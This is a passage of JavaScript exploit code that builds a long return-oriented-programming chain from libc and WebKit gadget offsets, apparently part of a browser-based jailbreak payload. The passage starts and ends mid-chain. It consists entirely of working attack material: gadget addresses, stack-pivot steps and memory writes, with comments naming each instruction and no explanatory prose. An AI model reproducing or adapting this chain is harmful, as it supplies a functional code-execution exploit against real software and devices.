set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+194704, //L2977
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2975:
db([65536, 0]); // 0x10000
set_gadget(libc_base+165442,); //pop rdi
//L2976:
db([65536, 0]); // 0x10000
set_gadget(webkit_base+3789839,); //pop r11
//L2977:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+194800, //L2979
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+194784, //L2978
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2978:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2979:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2980:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2982:
ropchain+194952, //L2981
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+219304, //L2983
//L2981:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+195040, //L2985
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2984:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L2985:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2987:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+772328, //pop rcx
//L2988:
(window.mira_blob||0),
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2990:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+195240, //L2993
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+195224, //L2992
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2992:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2993:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+195432, //L2999
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+195448, //L3000
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+195384, //L2996
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+195400, //L2997
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2996:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2997:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
//L2998:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2999:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3000:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+195560, //L3001+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+195552, //L3001
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L3001:
db([0, 0]); // 0x0
set_gadgets([
ropchain+195576, //L3001+24
ropchain+202024, //L2995
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3002:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+772328,); //pop rcx
//L3003:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+195672, //L3006
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3005:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3006:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+195728, //L3008
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3008:
db([0, 0]); // 0x0
//L3007:
set_gadgets([
libc_base+713278, //pop rsi
ropchain+195792, //L3011
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3010:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+772328,); //pop rcx
//L3011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+195896, //L3014
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+195880, //L3013
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3013:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3014:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+196056, //L3017
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+196088, //L3019
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+196040, //L3016
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+196072, //L3018
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3016:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3017:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3018:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3019:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+196168, //L3020
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+196184, //L3021
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3020:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3021:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+196280, //L3023
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+196264, //L3022
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3022:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3023:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+196392, //L3026
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L3024:
db([65536, 0]); // 0x10000
set_gadget(libc_base+165442,); //pop rdi
//L3025:
db([65536, 0]); // 0x10000
set_gadget(webkit_base+3789839,); //pop r11
//L3026:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+196504, //L3027
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+196536, //L3029
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+196520, //L3028
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3027:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3028:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3029:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+15055763, //cmp rax, rcx ; sete al
webkit_base+47019, //setl al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+196696, //L3030
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+196728, //L3032
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+196712, //L3031
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3030:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3031:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3032:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+196872, //L3036
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+196888, //L3037
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+196856, //L3035
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3034:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3035:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3036:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3037:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+197000, //L3038+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+196992, //L3038
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L3038:
db([0, 0]); // 0x0
set_gadgets([
ropchain+197016, //L3038+24
ropchain+197032, //L3033
libc_base+489696, //pop rsp
ropchain+197048, //L3039
//L3033:
libc_base+489696, //pop rsp
ropchain+202008, //L3040
//L3039:
libc_base+713278, //pop rsi
ropchain+197104, //L3042
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3041:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+772328,); //pop rcx
//L3042:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+197208, //L3045
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+197192, //L3044
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3044:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3045:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+197352, //L3049
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+197320, //L3047
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+197336, //L3048
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3047:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3048:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3049:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+197424, //L3050
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3050:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+197480, //L3052
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3052:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+197576, //L3055
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3054:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+772328,); //pop rcx
//L3055:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+197680, //L3058
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+197664, //L3057
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3057:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3058:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+197840, //L3061
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+197872, //L3063
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+197824, //L3060
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+197856, //L3062
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3060:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3061:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3062:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3063:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+197984, //L3064
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+198016, //L3066
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+198000, //L3065
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3064:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3065:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+198104, //L3067
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3067:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+198160, //L3069
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3069:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+198304, //L3072
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+198320, //L3073
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+198288, //L3071
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3071:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3072:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229136, //mov al, [rdi]
libc_base+713278, //pop rsi
ropchain+198480, //L3077
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+198448, //L3075
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+198464, //L3076
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3074:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L3075:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3076:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3077:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+198536, //L3078
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L3078:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+198664, //L3081
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+198680, //L3082
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+198648, //L3080
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3080:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3081:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3082:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+198840, //L3086
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+198808, //L3084
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+198824, //L3085
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3083:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L3084:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3085:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3086:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+198896, //L3087
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L3087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+199024, //L3090
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+199040, //L3091
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+199008, //L3089
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3089:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3090:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3091:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+199200, //L3095
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+199168, //L3093
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+199184, //L3094
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3092:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L3093:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3094:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3095:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+199256, //L3096
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L3096:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+199384, //L3099
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+199400, //L3100
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+199368, //L3098
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3098:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3099:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3100:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+199480, //L3101
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+199496, //L3102
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3101:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3102:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+199656, //L3106
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+199624, //L3104
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+199640, //L3105
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3103:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L3104:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3105:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3106:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+199712, //L3107
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L3107:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+199840, //L3110
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+199856, //L3111
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+199824, //L3109
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3109:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3110:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3111:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+199952, //L3113
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+199936, //L3112
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3112:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3113:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+200048, //L3115
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3114:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L3115:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+200152, //L3118
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+200136, //L3117
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3117:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3118:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+200296, //L3122
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+200264, //L3120
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+200280, //L3121
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3120:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3121:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3122:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+200368, //L3123
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3123:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+200424, //L3125
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3125:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+200520, //L3128
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3127:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+772328,); //pop rcx
//L3128:
db([0, 0]); // 0x0
set_gadgets([
